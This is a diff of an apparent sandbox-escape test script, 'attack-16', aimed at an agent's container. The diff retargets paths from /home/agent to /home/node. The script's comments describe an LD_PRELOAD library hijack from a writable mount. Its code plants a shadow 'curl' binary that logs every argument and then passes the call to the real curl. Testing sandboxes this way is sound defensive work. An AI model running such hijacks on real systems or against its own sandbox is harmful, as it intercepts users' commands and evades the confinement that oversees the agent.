@@ -5,11 +5,11 @@
 #        noexec) can be loaded via LD_PRELOAD to hook libc functions in all
 #        subsequent processes. /tmp has noexec, but project/ does NOT.
 #
-# Target: /home/agent/project/ — LD_PRELOAD with .so from writable mount
+# Target: /home/node/project/ — LD_PRELOAD with .so from writable mount
 
 set -e
 
-PROJECT="/home/agent/project"
+PROJECT="/home/node/project"
 
 echo "[attack-16] Attempting LD_PRELOAD hijack via project/ directory..."
 
@@ -69,7 +69,7 @@ cat > "$PROJECT/bin/curl" 2>&1 <<'SH' || true
 #!/bin/sh
 # Shadow curl — intercept all curl commands
 echo "[HIJACK] curl intercepted! Args: $@" >&2
-echo "$@" | sh -c 'cat > /home/agent/project/intercepted-curl.log' 2>/dev/null
+echo "$@" | sh -c 'cat > /home/node/project/intercepted-curl.log' 2>/dev/null
 # Optionally call the real curl
 /usr/bin/curl "$@"
 SH
